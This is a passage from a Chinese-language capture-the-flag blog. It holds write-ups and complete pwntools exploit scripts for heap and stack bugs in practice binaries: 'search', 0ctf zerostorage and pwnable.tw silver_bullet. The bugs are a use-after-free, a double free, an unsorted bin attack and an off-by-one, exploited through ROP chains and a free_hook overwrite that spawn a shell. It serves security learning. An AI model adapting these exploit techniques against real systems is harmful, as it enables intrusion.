class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./search"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Quit\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"a"</span>*<span class="number">48</span>)</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line">	p.sendline(<span class="string">"b"</span>*<span class="number">48</span>)</span><br><span class="line">	leak = p.recvline().split(<span class="string">' '</span>)[<span class="number">0</span>][<span class="number">48</span>:]</span><br><span class="line">    	<span class="keyword">return</span> int(leak[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(sentence)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Quit\n")</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the sentence size:\n"</span>)</span><br><span class="line">	p.sendline(str(len(sentence)))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the sentence:\n"</span>)</span><br><span class="line">	p.sendline(sentence)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(word)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Quit\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the word size:\n"</span>)</span><br><span class="line">	p.sendline(str(len(word)))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the word:\n"</span>)</span><br><span class="line">	p.sendline(word)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">	sentence = <span class="string">'a'</span>*<span class="number">12</span> + <span class="string">' b '</span></span><br><span class="line">	sentence = sentence.ljust(<span class="number">40</span>,<span class="string">'c'</span>)</span><br><span class="line">	index(sentence)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#delete s1</span></span><br><span class="line">	search(<span class="string">'b'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#n4 use s1</span></span><br><span class="line">	index(<span class="string">'d'</span>*<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#delete s1,but n4 still can use it=&gt;UAF</span></span><br><span class="line">	search(<span class="string">'\x00'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#a new sentence share space with n4</span></span><br><span class="line">	puts_got = <span class="number">0x602028</span></span><br><span class="line">	node =p64(<span class="number">0x400E90</span>) <span class="comment">#"Enter"</span></span><br><span class="line">	node += p64(<span class="number">5</span>)</span><br><span class="line">	node += p64(puts_got)</span><br><span class="line">	node += p64(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">	index(node)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#search 'Enter' to leak puts_address</span></span><br><span class="line">	search(<span class="string">'Enter'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Found 64: "</span>)</span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"###puts_addr:0x%x"</span> %puts_addr</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> puts_addr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overwrite_retn</span><span class="params">()</span>:</span></span><br><span class="line">	index(<span class="string">'a'</span>*<span class="number">54</span>+<span class="string">' d'</span>)</span><br><span class="line">	index(<span class="string">'b'</span>*<span class="number">54</span>+<span class="string">' d'</span>)</span><br><span class="line">	index(<span class="string">'c'</span>*<span class="number">54</span>+<span class="string">' d'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">	search(<span class="string">'d'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># b-&gt;a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">	search(<span class="string">'\x00'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># fake fastbin</span></span><br><span class="line">	index(p64(stack_addr).ljust(<span class="number">56</span>,<span class="string">'e'</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># malloc a and b</span></span><br><span class="line">	index(<span class="string">'f'</span>*<span class="number">56</span>)</span><br><span class="line">	index(<span class="string">'g'</span>*<span class="number">56</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># overwrite the ret address with gadget</span></span><br><span class="line">	pop_ret = <span class="number">0x400e23</span></span><br><span class="line">	sentence = <span class="string">'A'</span>*<span class="number">30</span></span><br><span class="line">	sentence += p64(pop_ret)</span><br><span class="line">	sentence += p64(binsh_addr)</span><br><span class="line">	sentence += p64(system_addr)</span><br><span class="line"></span><br><span class="line">	index(sentence)</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="comment">#leak stack address</span></span><br><span class="line">stack_leak = leak_stack()</span><br><span class="line">stack_addr = stack_leak + <span class="number">0x22</span> - <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc address</span></span><br><span class="line">puts_addr = leak_libc()</span><br><span class="line">libc = ELF(<span class="string">'libc.so'</span>)</span><br><span class="line">system_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">binsh_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#double free to edit the retn address in stack</span></span><br><span class="line">overwrite_retn()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/03/13/unsortedbin-attack-0ctf-zerostorage/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="0gur1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0gur1">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/" itemprop="url">unsortedbin_attack--0ctf zerostorage</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-13T20:09:32+08:00">
                2018-03-13
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/" class="leancloud_visitors" data-flag-title="unsortedbin_attack--0ctf zerostorage">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1,284字
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h1><p>代码中存在UAF漏洞时，可以通过操纵unsorted bin 的BK指针时，使其修改某一变量的值。举一个简单的例子:</p>
<p><a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c" target="_blank" rel="noopener">shellphish/how2heap/unsorted_bin_attack</a></p>
<p>一个unsorted bin，称为victim，victim具有UAF漏洞，则在释放后操作victim时，可以修改victim-&gt;bk为需要修改的变量var的地址-0x10，即&amp;var-0x10，这样在再次将victim分配时，会进行unlink操作，将var的值修改为unsorted bin头的地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;    <span class="comment">//bck = &amp;var-0x10</span></span><br><span class="line">unsorted_chunk(av)-&gt;bk = bck; </span><br><span class="line">bck-&gt;fd = unsorted_chunk(av) <span class="comment">//*(&amp;var-0x10+0x10) = unsorted_chunk(av) =&gt; var = unsorted_chunk(av)</span></span><br></pre></td></tr></table></figure>
<p>典型的应用是修改global_max_fast，这个全局变量代表着fastbin 中能够放入的最大chunk的大小，通过修改这个值可以让所有的chunk释放之后都挂在fastbin上，由于fastbin的结构简单，是单链结构，进而进行fastbin攻击。</p>
<h1 id="实例：0ctf-zerostorage"><a href="#实例：0ctf-zerostorage" class="headerlink" title="实例：0ctf zerostorage"></a>实例：0ctf zerostorage</h1><h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p>典型的对堆进行操作的题：</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/main.png" alt="功能menu"></p>
<p>insert函数中可以看出，有一个全局数组entries，应该是一个结构体数组，每一个结构体占24个字节，前四个字节记录是否使用中，接着四个字节的padding，然后是8字节的长度和8字节的内容地址信息，这里地址信息不是直接记录的，而是通过与/dev/urandom中的数字异或后存放的。 content内容地址的分配内存是分三种情况：x&lt; 128 直接分配大小为128；128&lt;=x&lt;=4096 分配大小为x；x&gt;4096只分配4096大小。</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/insert.png" alt="insert关键代码"></p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/random.png" alt="异或的值来自/dev/urandom"></p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/entry.png" alt="结构体结构"></p>
<p>update函数用于重新编辑content，必要时重新分配内存，修改length和content addr。</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/update.png" alt="update函数关键代码"></p>
<p>merge函数合并两个entry对应的content，释放第一个entry的content，将第一个entry各项置零，并重新找到一个entry，把合并后的content地址赋给新的entry 的 content addr。</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/merge.png" alt="merge函数关键代码"></p>
<p>delete函数释放entry的content addr 所指的内存，并将指针置零，entry中的各项也置零，很安全，是free的正确使用方法。</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/delete.png" alt="delete函数关键代码"></p>
<p>view函数查看内容</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/view.png" alt="view函数"></p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>虽然本题的delete函数非常安全，但是在merge函数中，如果输入的两个编号一样，将会先free 然后又把指针给另一个entry，即UAF。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>本题开了所有保护，关键是PIE</p>
<p><img src="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/checksec.png" alt="checksec"></p>
<p>本题还提到一条，之后会用到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Notice: Latest Ubuntu 14.04.4 LTS, with 3.13.0-79-generic kernel.</span><br></pre></td></tr></table></figure>
<p><strong>libc地址泄露：</strong> 第一个释放的chunk（不是fastbin），其FD和BK指针都指向main_arena中bins结构中的unsorted bin头，main_arena中的各个值存放于libc中的bss段，因此，可以在merge 之后读取这一块的前八个字节，正好是libc中的地址，通过偏移可以计算出libc的基址。</p>
<p>由于本题开了PIE，因此不能直接获取程序中指令的地址，但是在 Notice中提到的【Ubuntu 14.04.4 LTS, with 3.13.0-79-generic kernel】的操作系统存在着<a href="https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html" target="_blank" rel="noopener">offsetlibc</a>的漏洞，也就是说可以从libc的基址推断出程序的基址。</p>
<p><strong>unsorted bin attack修改global_max_fast的值：</strong> update上一步提到的块，将BK修改为&amp;global_max_fast -0x10，FD修改为一个较大的值。再insert一个新的entry时，会将这个块从unsorted bin上unlink后分给新 entry的content，由此完成了对global_max_fast值的改写，接下来的所有块都将属于fastbin的范围。</p>
<p><strong>fastbin劫持用于读取random的值：</strong> 再merge另外两个相同的块，此时释放的块将挂在fastbin上，设某一已经分配的entry的index为idx1，利用UAF修改该fastbin的FD指针为entries[idx1]，且保证entries[idx1]和merge的块在fastbin中的大小相同，如均为144，因为fastbin在分配时候会首先检查chunk的size字段是否为当前链中应该的大小。 之后再insert两次，第一次将merge的块从fastbin中摘除，此时fastbin的头就指向了entries[idx1]，第二次insert就把entries[idx1]分给了新的entry 称为 entries[idx3]，即entries[idx3]的content addr指向entries[idx1]。由于entries[idx3] + 0x16中记载的是entries[idx1]^random，通过update idx3将这个值读出后异或entries[idx1]，由此得到random的值</p>
<p>这次的shell的执行没有用system，学到了一个新的知识：</p>
<p><a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a></p>
<p>再次update idx3，修改idx1下一个entry idx2的content addr处为 free_hook^ random，这样再update idx2时，相当于修改free_hook的值，将其写为one_gadget的地址。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>由于目前手中没有Ubuntu 14.xx的系统，在此只记录思路，之后再做具体复现，exp可以参考</p>
<p><a href="https://github.com/HQ1995/Heap_Senior_Driver/blob/master/0ctf2016/zerostorage/x.py" target="_blank" rel="noopener">Hanquing Zhao</a></p>
<p>思路：</p>
<p>用#0，#1，…代表entries[0]，entries[1]；&amp;0，&amp;1，….代表堆上分配的各个content编号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">insert #0 -&gt; &amp;0</span><br><span class="line">insert #1 -&gt; &amp;1</span><br><span class="line">insert #2 -&gt; &amp;2</span><br><span class="line"></span><br><span class="line">merge #1,#1 =&gt; #3-&gt;&amp;1(已free)</span><br><span class="line">view #3 =&gt;读FD 泄露libc地址，进而获取one_gadget地址、entries地址和free_hook地址</span><br><span class="line"></span><br><span class="line">update #3 =&gt;覆写global_max_fast的值，之后所有chunk都属于fastbin</span><br><span class="line"></span><br><span class="line">insert #1 -&gt; &amp;1</span><br><span class="line">insert #4 -&gt; &amp;3</span><br><span class="line">insert #5 -&gt; &amp;4</span><br><span class="line"></span><br><span class="line">merge #4,#4 =&gt; #6-&gt;&amp;3(已free)</span><br><span class="line">update #6 =&gt;FD的值写成#5（entries[5]）的地址</span><br><span class="line"></span><br><span class="line">insert #7-&gt;&amp;3</span><br><span class="line">insert #8-&gt;#5 </span><br><span class="line"></span><br><span class="line">view #8 =&gt;获取random的值</span><br><span class="line">update #8 =&gt;覆写#6的各个字段，重点是将content_addr写为random^free_hook</span><br><span class="line">update #6 =&gt;在free_hook中写入one_gadget地址</span><br><span class="line"></span><br><span class="line">delete #0 =&gt;调用free_hook即one_gadget</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/03/08/pwnable-tw-silver-bullet/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="0gur1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0gur1">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/08/pwnable-tw-silver-bullet/" itemprop="url">pwnable.tw-silver_bullet</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-08T16:09:21+08:00">
                2018-03-08
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/03/08/pwnable-tw-silver-bullet/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/03/08/pwnable-tw-silver-bullet/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/03/08/pwnable-tw-silver-bullet/" class="leancloud_visitors" data-flag-title="pwnable.tw-silver_bullet">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  959字
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="silver-bullet"><a href="#silver-bullet" class="headerlink" title="silver_bullet"></a>silver_bullet</h1><h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p>依旧是菜单类型的小游戏：</p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/menu.png" alt="menu"></p>
<p>这道题就是create一个silver bullet（简称sb），输入的字符串长度就是sb的能量，power up会用strncat连接上新输入的字符串，仍旧是长度是能量，然后能量达到一定值时beat ，然后返回。</p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>power_up函数中，用到了strncat，而该函数<strong>会在末尾主动加入\0</strong>。这个操作有机会覆盖s[48]，即记录字符串长度的最低位。</p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/power_up.png" alt="漏洞所在--power_up函数"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>考虑到power_up只在s[48]&lt;=47时起作用，可以分两次操作：先create一个47长度的sb，然后power_up 1，通过strncat，\0就会覆盖s[48]，再计算长度时就为0+1=1</p>
<p>这样就可以继续再写47个字符了，并且是从s[48]之后开始写。</p>
<p>继续写的字符可以伪造ROP，当然为了返回，应该首先执行beat函数，将s[48]的之后三位写成FF FF FF，这样当以int类型读取字符串大小时（即从s[48]开始，长度为4的int），大小为FFFFFF01，就可以利用beat成功返回了。</p>
<p><strong>system函数地址泄露：</strong>通过puts输出函数地址，从而泄露system的地址。因为可以继续写47个字符，将有机会覆写main的返回地址。将main的返回地址写为puts@plt，并在此处构造ROP结构，称为ROP1，puts函数的参数为puts@got，即读出puts的实际地址，进而泄露system地址。由于ROP1中不能继续构造新的ROP，因此将返回地址位置写为一个gadget。</p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/ROP1.png" alt="puts函数的ROP1结构"></p>
<p><strong>system函数调用：</strong></p>
<p><strong>1）写入system函数–read_input：</strong>上一步只是泄露了system的地址，并未写入到栈结构中，因此需要另一次机会将system地址写入，程序中提供的read_input函数正好可以实现这个功能。这就要求从puts函数返回之后应该继续执行read_input函数，找到一个pop|retn 的gadget作为ROP1 的返回地址，执行时先pop出puts@got，再返回read_input。</p>
<p>接着构造一个read_input函数的ROP结构，称为ROP2。由于栈溢出只能再写47个字节，再写一个system的ROP结构不够用，因此考虑在另一块空间继续写入system的ROP结构。这个空间可以选在BSS段之后的地址，起名为fake_addr。read_input的第一个参数为fake_addr，第二个参数为大小，返回地址争取直接跳到fake_addr处。</p>
<p>在覆写main函数返回地址时将ebp覆写为fake_addr，之后保证ebp不变，在ROP2的返回地址处写入leave|retn的gadget使得 leave时 esp = ebp = fake_addr，pop ebp，然后返回执行system函数。</p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/ROP2.png" alt="read_input函数的ROP2"></p>
<p><strong>2）system函数的ROP</strong>：先是一个随意的值用于pop ebp，接着写入system地址和参数。</p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/ROP3.png" alt="system函数的ROP3结构"></p>
<p>整体的栈结构如下：</p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/whole.png" alt=""></p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/ROP3.png" alt="整体栈结构"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./silver_bullet'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10103</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b*0x80485eb')</span></span><br><span class="line"><span class="comment"># create size:47</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give me your description of bullet :'</span>)</span><br><span class="line">payload1 =<span class="string">'a'</span> * <span class="number">47</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overflow size:1</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give me your another description of bullet :'</span>)</span><br><span class="line">payload2 =<span class="string">'b'</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite stack</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give me your another description of bullet :'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x80484a8</span></span><br><span class="line">puts_got = <span class="number">0x804afdc</span></span><br><span class="line">fake_addr = <span class="number">0x804b410</span></span><br><span class="line"></span><br><span class="line">pr_addr = <span class="number">0x08048475</span></span><br><span class="line">lr_addr = <span class="number">0x8048a18</span></span><br><span class="line">read_input = <span class="number">0x80485eb</span></span><br><span class="line">payload3 = <span class="string">'\xff'</span> * <span class="number">3</span> + p32(fake_addr) + p32(puts_plt) + p32(pr_addr) + p32(puts_got) + p32(read_input) + p32(lr_addr) + p32(fake_addr) + p32(<span class="number">0x1011</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload3)</span><br><span class="line"><span class="comment">#beat and execute </span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line"><span class="keyword">if</span> d:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Oh ! You win !!\n'</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_addr: 0x%x'</span> %puts_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#read_input content</span></span><br><span class="line">payload = p32(fake_addr) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(fake_addr + <span class="number">0x10</span>) + <span class="string">'/bin/sh'</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/03/08/pwnable-tw-hacknote/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="0gur1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0gur1">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/08/pwnable-tw-hacknote/" itemprop="url">pwnable.tw--hacknote</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-08T15:52:14+08:00">
                2018-03-08
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
